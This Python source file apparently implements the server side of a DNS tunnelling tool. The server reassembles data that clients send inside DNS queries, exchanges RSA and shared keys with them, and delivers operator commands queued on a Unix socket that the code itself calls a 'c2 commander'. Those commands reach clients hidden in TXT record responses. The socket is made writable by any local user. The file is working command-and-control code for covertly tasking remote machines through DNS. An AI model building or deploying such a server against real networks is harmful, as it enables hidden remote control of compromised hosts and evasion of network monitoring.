import os
import asyncio
from subprocess import check_output
from scapy.all import DNS, DNSQR, DNSRR, raw
import weakref
import json
from collections import OrderedDict
from struct import Struct
import random
import time
from datetime import datetime
import stat
import shutil
import sys
from copy import deepcopy
import hashlib
import toml
from cryptography.hazmat.backends import default_backend as crypto_default_backend
from cryptography.hazmat.primitives.asymmetric import padding as crypto_padding
from cryptography.hazmat.primitives import serialization as crypto_serialization, hashes as crypto_hashes

from .helpers import get_logger, PYTHON_GREATER_37
from .message import MessageBuilder

logger = None
PATH_CONFIG = 'pydnst.toml'

RESPOND_TO_KEEP_ALIVE = True
RESPOND_ACK_TO_FRAGMENTS = True #True
SERVER_SENDS_RSA_KEY_HASH_CONFIRMATION = False #True
SERVER_SENDS_RSA_KEY_HASH_CONFIRMATION = SERVER_SENDS_RSA_KEY_HASH_CONFIRMATION and RESPOND_ACK_TO_FRAGMENTS

MSG_2_STRUCT = Struct('H') #2 bytes
KA_COMMAND_ID = '0' #keep-alive command_id is 0
RSA_COMMAND_ID = '1'
ACK_COMMAND_ID = '2'
COMMANDS_WITHOUT_ENCRYPTION = (KA_COMMAND_ID, RSA_COMMAND_ID, ACK_COMMAND_ID)
COMMANDS_WITHOUT_ACK = (KA_COMMAND_ID, ACK_COMMAND_ID)  #with REQUEST_NEXT_FROM_SERVER and REQUEST_RSA_KEY_HASH_FROM_SERVER
MIN_COMMAND_ID = 3

REQUEST_NEXT_FROM_SERVER = b'nextpls'
REQUEST_RSA_KEY_HASH_FROM_SERVER = b'cfrmpls'


class DnstServerProtocol(asyncio.DatagramProtocol):
    def __init__(self, tunnel_messages, tunnel_mng_messages, store_ordered_tunnel_messages, pending_fragments_to_send_events,
                         server_private_key, shared_keys, DNST_SERVER_NAME, FILTERED_QUERY_NAMES, DEFAULT_SHARED_KEY):
        self.loop = asyncio.get_event_loop()
        self.is_server = True        
        self.dnst_id = '0'
        self.transport = None
        self.DNST_SERVER_NAME = DNST_SERVER_NAME
        self.FILTERED_QUERY_NAMES = FILTERED_QUERY_NAMES
        self.DEFAULT_SHARED_KEY = DEFAULT_SHARED_KEY
        self.message_builder = MessageBuilder(logger, weakref.proxy(self), self.DNST_SERVER_NAME, self.DEFAULT_SHARED_KEY)
        self.max_data_length = self.message_builder.max_data_length['response']        
        if self.message_builder.max_fragment_payload_sizes['response']['TXT'] < 1:
            logger.error(f'Cannot work with too long domain name {self.DNST_SERVER_NAME}')     
            sys.exit(1)
        #we enforce keep-alive to be only 1 fragment, by limiting the client_details size
        self.received_fragments = {}    # {client_id : {command_id : {'date':'', 'list_of_fragments':[]} } , }
        #tunnel_messages stored in MESSAGES_JSON : 
        #{client_id :  {command_id : {'command_awaiting_ka | command_sent' : '', 'date' : '', 'response' : ''} }, }
        self.tunnel_messages, self.store_ordered_tunnel_messages = tunnel_messages , store_ordered_tunnel_messages
        self.pending_fragments_to_send_events = pending_fragments_to_send_events
        self.server_private_key, self.shared_keys = server_private_key, shared_keys
        self.tunnel_mng_messages = tunnel_mng_messages
        
    
    def connection_made(self, transport):
        self.peername = transport.get_extra_info('peername')
        if self.peername:
            logger.info(f'connection_made from : {self.peername}')
        self.transport = transport
        super().connection_made(transport)

    def datagram_received(self, data, addr):
        try:
            self.remote_address, self.remote_port = self.peername = addr
            logger.debug(f'datagram_received from {self.peername} : {data}')
            super().datagram_received(data, addr)
            data_scapy = DNS(data)
            qname_scapy = data_scapy.qd.qname
            if qname_scapy.rstrip(b'.') in self.FILTERED_QUERY_NAMES:
                return                         
            if self.DNST_SERVER_NAME not in qname_scapy:
                return
            logger.info(f'datagram_received from {self.peername} : {data}')            
            logger.debug(f'Parsed datagram received : {DNS(data).show(dump=True)}')
            res = self.message_builder.reassemble_fragment(qname_scapy)
            if res is False:
                return
            
            client_id, command_id, fragment_id, number_of_fragments, is_ready = res
            if RESPOND_ACK_TO_FRAGMENTS:                
                if command_id not in COMMANDS_WITHOUT_ACK:
                    #event_desc = self.pending_fragments_to_send_events.get(client_id, {}).get(command_id, None)
                    #if event_desc:
                    #    logger.info(f'During sending of pending fragments : Not responding ack to non last fragment {is_ready} for client {client_id} and command {command_id}')
                    #    self.received_fragments[client_id].pop(command_id, None)
                    ##    self.send_next_fragment(client_id, command_id, 'TXT', addr, data_scapy)
                    #    return
                    send_ack = True
                    message_entry = self.tunnel_mng_messages.get(command_id, {}).get(client_id, None)
                    if message_entry:
                        if message_entry.startswith(REQUEST_NEXT_FROM_SERVER):
                            logger.info(f'tunnel_mng_messages : Not sending ack to a REQUEST_NEXT_FROM_SERVER to fragment {fragment_id} out of {number_of_fragments} for client {client_id} and command {command_id}')                        
                            send_ack = False
                        elif message_entry.startswith(REQUEST_RSA_KEY_HASH_FROM_SERVER):                
                            logger.info(f'tunnel_mng_messages : Not sending ack to a REQUEST_RSA_KEY_HASH_FROM_SERVER to fragment {fragment_id} out of {number_of_fragments} for client {client_id} and command {command_id}')
                            send_ack = False
                    message_entry = self.tunnel_messages.get(client_id, {}).get(command_id, {}).get('command_sent', None)
                    if message_entry:
                        if message_entry.encode().startswith(REQUEST_NEXT_FROM_SERVER):
                            logger.info(f'tunnel_messages : Not sending ack to a REQUEST_NEXT_FROM_SERVER to fragment {fragment_id} out of {number_of_fragments} for client {client_id} and command {command_id}')                        
                            send_ack = False
                        elif message_entry.encode().startswith(REQUEST_RSA_KEY_HASH_FROM_SERVER):                
                            logger.info(f'tunnel_messages : Not sending ack to a REQUEST_RSA_KEY_HASH_FROM_SERVER to fragment {fragment_id} out of {number_of_fragments} for client {client_id} and command {command_id}')
                            send_ack = False                        
                    if send_ack:     
                        logger.info(f'Responding ack to fragment {fragment_id} out of {number_of_fragments} for client {client_id} and command {command_id}')                        
                        ack_response = str(fragment_id) + '-' + str(random.randint(1,256))    #send ack with the fragment index in is_ready
                        self.send_data(ack_response.encode(), ACK_COMMAND_ID, client_id, addr,
                                                    rtype='TXT', data_scapy=data_scapy)                
            if is_ready is not True:                    
                return
            if self.server_private_key:
                if command_id in (RSA_COMMAND_ID, ACK_COMMAND_ID):
                    message_entry = self.tunnel_mng_messages[command_id].pop(client_id, b'')
                    if message_entry:
                        if message_entry.startswith(REQUEST_RSA_KEY_HASH_FROM_SERVER):
                            if SERVER_SENDS_RSA_KEY_HASH_CONFIRMATION:
                                hasher = hashlib.sha256()
                                hasher.update(self.shared_keys[client_id])
                                shared_key_hash = hasher.digest()
                                logger.info(f'Sending shared_key hash response for client {client_id}')
                                shared_key_hash_response = self.server_private_key.sign(
                                    shared_key_hash,
                                    crypto_padding.PSS(
                                        mgf=crypto_padding.MGF1(crypto_hashes.SHA256()),
                                        salt_length=crypto_padding.PSS.MAX_LENGTH
                                    ),
                                    crypto_hashes.SHA256()
                                )    
                                self.send_data(shared_key_hash_response, RSA_COMMAND_ID, client_id, addr,
                                                                   rtype='TXT', data_scapy=data_scapy)
                            return
                        elif command_id == RSA_COMMAND_ID: 
                            if message_entry.startswith(REQUEST_NEXT_FROM_SERVER):
                                event_desc = self.pending_fragments_to_send_events.get(client_id, {}).get(command_id, None)                            
                                if event_desc:
                                    try:
                                        fragment_acked = int(message_entry.split(b'-')[1])
                                    except Exception:
                                        logger.exception(f'Invalid REQUEST_NEXT_FROM_SERVER content received from client {client_id} : {message_entry}')
                                        return
                                    logger.info(f'Received request from client {client_id} and command {command_id} to send next rsa fragment, after fragment {fragment_acked} was acked')                                
                                    self.send_next_fragment(client_id, command_id, fragment_acked, 'TXT', addr, data_scapy)
                                else:
                                    logger.info(f'Received request from client {client_id} and command {command_id} to send next rsa fragment, but no pending fragment')
                                return
                            logger.info(f'Received shared_key for client {client_id}, decrypting it')
                            self.shared_keys[client_id] = self.server_private_key.decrypt(
                                            message_entry,
                                            crypto_padding.OAEP(
                                            mgf=crypto_padding.MGF1(algorithm=crypto_hashes.SHA256()),
                                            algorithm=crypto_hashes.SHA256(),
                                            label=None
                                        ))
                                                    
                            self.message_builder.use_shared_key_for_client(client_id, self.shared_keys[client_id])
                    return
                elif client_id not in self.shared_keys:
                    logger.info(f'Received command {command_id} from client {client_id} without having a shared_key for that client, asking one...')
                    hasher = hashlib.sha256()
                    hasher.update(b'Asking for a shared_key')    #dummy error message, anything different from the real shared_key_hash will lead the client to send it again
                    ask_for_shared_key = hasher.digest()                    
                    server_response = self.server_private_key.sign(
                        ask_for_shared_key,
                        crypto_padding.PSS(
                            mgf=crypto_padding.MGF1(crypto_hashes.SHA256()),
                            salt_length=crypto_padding.PSS.MAX_LENGTH
                        ),
                        crypto_hashes.SHA256()
                    )    
                    self.send_data(server_response, RSA_COMMAND_ID, client_id, addr,
                                                       rtype='TXT', data_scapy=data_scapy)
                    return                    
            
            tunnel_messages = self.tunnel_messages[client_id]
            if command_id == KA_COMMAND_ID:
                logger.info(f'Received keep-alive from {client_id}, with transaction id {data_scapy.id}, and name {qname_scapy}')
                #check if there is a command to send for this client
                for cmd_id in tunnel_messages:
                    if cmd_id != KA_COMMAND_ID and (tunnel_messages[cmd_id].get('command_awaiting_ka') or ( tunnel_messages[cmd_id].get('command_sent') and not tunnel_messages[cmd_id].get('response'))):
                        command_to_send = tunnel_messages[cmd_id].pop('command_awaiting_ka', None)
                        if command_to_send is None:
                            #this can happen with weird dns servers sending cached requests with delay
                            command_to_send = tunnel_messages[cmd_id]['command_sent']
                            logger.info('Trying to send again command {cmd_id} : {command_to_send}')                                
                        logger.info(f'There is a command to send to this client {client_id} : {command_to_send}')
                        tunnel_messages[cmd_id]['command_sent'] = command_to_send
                        self.store_ordered_tunnel_messages(self.tunnel_messages)
                        self.send_data(command_to_send.encode(), cmd_id, client_id, addr, rtype='TXT', data_scapy=data_scapy)
                        break
                else:
                    if RESPOND_TO_KEEP_ALIVE:
                        dummy_response = str(random.randint(1,256))
                        logger.info(f'No command to send to client {client_id}, sending dummy response {dummy_response} to keep-alive')
                        self.send_data(dummy_response.encode(), KA_COMMAND_ID, client_id, addr,
                                                           rtype='TXT', data_scapy=data_scapy)
                    else:
                        logger.info(f'No command to send to client {client_id}')                            
                                                
            else:
                command_sent = self.tunnel_messages.get(client_id, {}).get(command_id, {}).get('command_sent', None)
                message_entry = self.tunnel_messages.get(client_id, {}).get(command_id, {}).get('response', None)
                if message_entry:                    
                    logger.info(f'Received valid response to command {command_sent} from client {client_id} with transaction id {data_scapy.id}')                    
                    #the response was already written in self.tunnel_messages by message.reassemble_fragment
                    if message_entry.encode().startswith(REQUEST_NEXT_FROM_SERVER):
                        event_desc = self.pending_fragments_to_send_events.get(client_id, {}).get(command_id, None)                        
                        if event_desc:
                            try:
                                fragment_acked = int(message_entry.split(b'-')[1])
                            except Exception:
                                logger.exception(f'Invalid REQUEST_NEXT_FROM_SERVER content received from client {client_id} : {message_entry}')
                                return
                            logger.info(f'Received request from client {client_id} and command {command_id} to send next fragment, after fragment {fragment_acked} was acked')                                
                            self.send_next_fragment(client_id, command_id, fragment_acked, 'TXT', addr, data_scapy)
                        else:
                            logger.info(f'Received request from client {client_id} and command {command_id} to send next fragment, but no pending fragment')                        
                        return
                else:
                    logger.info(f'Received valid response but no matching client {client_id} and command {command_id}. Ignoring...')                    
        except Exception:
            logger.exception('datagram_received')
            try:
                logger.error(f'invalid datagram_received from {self.peername} : {data}')
            except Exception:
                pass

    def send_data(self, data, command_id, client_id, addr, rtype='TXT', data_scapy=None, without_encryption=False):
        logger.info(f'Sending data of length {len(data)}')
        if command_id in COMMANDS_WITHOUT_ENCRYPTION:
            without_encryption = True
        if len(data) > self.max_data_length:
            logger.info(f'Truncating data of length {len(data)} to {self.max_data_length}')
            data = data[:self.max_data_length]
        fragments = self.message_builder.fragmenter(data, rtype, client_id, command_id, is_dns_response=True,
                                                    without_encryption=without_encryption)
        self.loop.create_task(self.send_fragments(command_id, client_id, fragments, rtype, addr, data_scapy))
        
    async def send_fragments(self, command_id, client_id, fragments, rtype, addr, data_scapy=None):
        logger.info(f'Starting send_fragments task for transaction id {data_scapy.id}')
        number_of_fragments = len(fragments)
        logger.info(f'Sending fragment 1 out of {number_of_fragments}')
        if number_of_fragments > 1:
            #prepare mechanism for sending of multiple fragments
            if client_id not in self.pending_fragments_to_send_events:
                self.pending_fragments_to_send_events[client_id] = {}
            self.pending_fragments_to_send_events[client_id][command_id] = {'list':deepcopy(fragments), 'number_of_fragments':number_of_fragments}
        self.send_message(fragments[0], rtype, addr, data_scapy)

    def send_next_fragment(self, client_id, command_id, fragment_acked, rtype, addr, data_scapy):
        #next fragments will be sent on the next udp sockets querying them
        pointer = self.pending_fragments_to_send_events[client_id][command_id]
        pointer_list = pointer['list']
        if not all([(el is True) for el in pointer_list]):
            pointer_list[fragment_acked-1] = True    #True means this fragment was successfully acked by client
            for index in range(len(pointer_list)):
                fragment = pointer_list[index]
                if fragment is not True:
                    logger.info(f'Sending fragment {index+1} out of {pointer["number_of_fragments"]}')
                    self.send_message(fragment, rtype, addr, data_scapy)
                    break
        if all([(el is True) for el in pointer_list]):
            self.pending_fragments_to_send_events[client_id].pop(command_id)
            if not self.pending_fragments_to_send_events[client_id]:
                self.pending_fragments_to_send_events.pop(client_id)
        
    def send_message(self, dns_data, rtype, addr, data_scapy=None):
        logger.info(f'Starting send_message task for transaction id {data_scapy.id} to addr {addr}')
        logger.debug(f'Reusing query qd {data_scapy.show(dump=True)}')
        message = raw(DNS(qr=1, id=data_scapy.id, aa=1, rd=0, qd=data_scapy.qd, an=DNSRR(rdata=dns_data, ttl=0,
                                                    rrname=data_scapy.qd.qname, type=rtype)))
        logger.info(f'Sending message {message}, with data {dns_data}, and type {rtype}')
        self.transport.sendto(message, addr)

    def error_received(self, exc):
        logger.warning(f'error_received : {exc}')

    def connection_lost(self, exc):
        logger.info(f'connection_lost from : {self.peername}, {exc}')
        super().connection_lost(exc)


class DnstServer:

    def __init__(self):
        global logger
        logger = get_logger(logger_name='pydnst_server')

        if not os.path.exists(PATH_CONFIG):
            logger.info(f'No config file at {PATH_CONFIG}, leaving ...')
            sys.exit(1)    
        with open(PATH_CONFIG,'r') as fd:
            config_toml = toml.load(fd)
        config_server = config_toml['server']
        self.LISTENING_INTERFACE = config_server['LISTENING_INTERFACE']
        self.LISTENING_PORT = config_server['LISTENING_PORT']
        self.SERVER_PRIVATE_PEM_PATH = config_server['SERVER_PRIVATE_PEM_PATH']
        self.MESSAGES_JSON = config_server['MESSAGES_JSON']
        self.UDS_PATH_COMMANDER = config_server['UDS_PATH_COMMANDER']

        self.DNST_SERVER_NAME = DNST_SERVER_NAME = config_toml['general']['DNST_SERVER_NAME'].encode()
        self.FILTERED_QUERY_NAMES = (DNST_SERVER_NAME, b'ns1.'+DNST_SERVER_NAME, b'ns2.'+DNST_SERVER_NAME,
                        b'www.'+DNST_SERVER_NAME, b'www.ns1.'+DNST_SERVER_NAME, b'www.ns2.'+DNST_SERVER_NAME, 
                        b'_dmarc.'+DNST_SERVER_NAME)
        self.DEFAULT_SHARED_KEY = config_toml['general']['DEFAULT_SHARED_KEY'].encode()
        
        try:
            self.LISTENING_ADDRESS = check_output(f"ip --brief addr show {self.LISTENING_INTERFACE} | awk -F ' ' '{{ print $3 }}' | cut -d '/' -f 1", shell=True).strip().decode()
        except Exception:
            logger.exception('Cannot obtain eth0 ip address to listen on')
            print('Cannot obtain eth0 ip address to listen on')
            raise
        self.uds_path_commander = self.UDS_PATH_COMMANDER
        self.tunnel_messages = {}
        self.tunnel_mng_messages = {RSA_COMMAND_ID:{}, ACK_COMMAND_ID:{}}
        self.pending_fragments_to_send_events = {}
        
        try:
            with open(self.MESSAGES_JSON, 'w') as fd:
                json.dump({}, fd)
        except Exception:
            logger.exception('init')
            
        self.server_private_key = None
        self.shared_keys = {}        
        if os.path.exists(self.SERVER_PRIVATE_PEM_PATH):
            logger.info('Using a server private pem')            
            try:
                with open(self.SERVER_PRIVATE_PEM_PATH, 'rb') as key_file:
                    self.server_private_key = crypto_serialization.load_pem_private_key(
                        key_file.read(),
                        password=None,
                        backend=crypto_default_backend()
                    )
            except Exception:
                logger.exception('server_private_key')

    def store_ordered_tunnel_messages(self, tunnel_messages):
        #replace command_id 0 by 'keep-alive' in json_display (stored json self.MESSAGES_JSON)
        json_display = {}
        for key,value in tunnel_messages.items():
            new_value = {}
            for key1,value1 in value.items():
                new_value[key1 if key1 != '0' else 'keep-alive'] = value1
            json_display[key] = new_value
            
        #order display by date (per client)
        res = OrderedDict({kk:json_display[kk] for kk in sorted(json_display,
                   key=lambda ke: json_display[ke][list(json_display[ke].keys())[0]]['date'], reverse=True)})
    
        new_res = OrderedDict()
        for key,vdict in res.items():
            new_res[key] = OrderedDict({kk:vdict[kk] for kk in sorted(vdict, key=lambda ke: vdict[ke]['date'], reverse=True)})
    
        with open(self.MESSAGES_JSON, 'w') as fd:
            json.dump(new_res, fd, indent=4)    

    def generate_command_id(self):
        return str(random.randint(MIN_COMMAND_ID,256))
        
    async def commander_cb(self, reader, writer):
        #header of 2 bytes telling the length to read
        try:
            logger.info('commander_cb was called')
            next_length_bytes = await reader.readexactly(MSG_2_STRUCT.size)
            next_length = MSG_2_STRUCT.unpack(next_length_bytes)[0]
            command_to_send = await asyncio.wait_for(reader.readexactly(next_length), timeout=5)
            command_json = json.loads(command_to_send.decode())
            client_id = command_json['client_id']
            command = command_json['command']
            now = datetime.fromtimestamp(time.time()).strftime(r'%Y-%m-%d--%H:%M:%S')
            command_id = self.generate_command_id()
            if client_id not in self.tunnel_messages:
                logger.warning(f'Client {client_id} not found in tunnel_messages {self.tunnel_messages}. Ignoring ...')
                return
            self.tunnel_messages[client_id][command_id] = {'command_awaiting_ka':command, 'date':now}
            self.store_ordered_tunnel_messages(self.tunnel_messages)
            writer.write(b'ok')
            try:
                await asyncio.wait_for(writer.drain(), timeout=5)
            except Exception:
                logger.exception('commander_cb writer drain')
            logger.info(f'Command {command} was successfully added to tunnel_messages for client {client_id}')
        except asyncio.CancelledError:
            raise            
        except Exception:
            logger.exception('commander_cb')
        finally:
            writer.close()
            if PYTHON_GREATER_37:
                try:
                    await writer.wait_closed()      #python 3.7                                              
                except Exception as exc:
                    logger.warning('commander_cb writer.wait_closed : '+str(exc))            
        
    async def run_command_listener(self):
        logger.info('Starting command listener')
        self.commander_server = await asyncio.start_unix_server(self.commander_cb, path=self.uds_path_commander)
        #for convenience we want non root to be able to use the c2 commander        
        os.chmod(self.uds_path_commander, stat.S_IRWXU | stat.S_IRWXG | stat.S_IROTH | stat.S_IWOTH)
        
    def run(self):
        try:
            self.loop = asyncio.get_event_loop()
            logger.info(f'DnstServer listening on {self.LISTENING_ADDRESS}:{self.LISTENING_PORT}')
            dnst_server_task = self.loop.create_datagram_endpoint(lambda :DnstServerProtocol(
                                                                self.tunnel_messages, self.tunnel_mng_messages,
                                                                self.store_ordered_tunnel_messages, self.pending_fragments_to_send_events,
                                                                self.server_private_key, self.shared_keys, self.DNST_SERVER_NAME,
                                                                self.FILTERED_QUERY_NAMES, self.DEFAULT_SHARED_KEY),
                                                                local_addr=(self.LISTENING_ADDRESS, self.LISTENING_PORT))
            transport, protocol = self.loop.run_until_complete(dnst_server_task)
            self.loop.run_until_complete(self.run_command_listener())
            self.loop.run_forever()
        except Exception:
            logger.exception('run')       
        except:
            logger.info('DnstServer stopped')            
        finally:
            try:
                shutil.copy(self.MESSAGES_JSON, self.MESSAGES_JSON+'.bk')
                os.remove(self.MESSAGES_JSON)
                transport.close()
            except Exception:
                pass

    
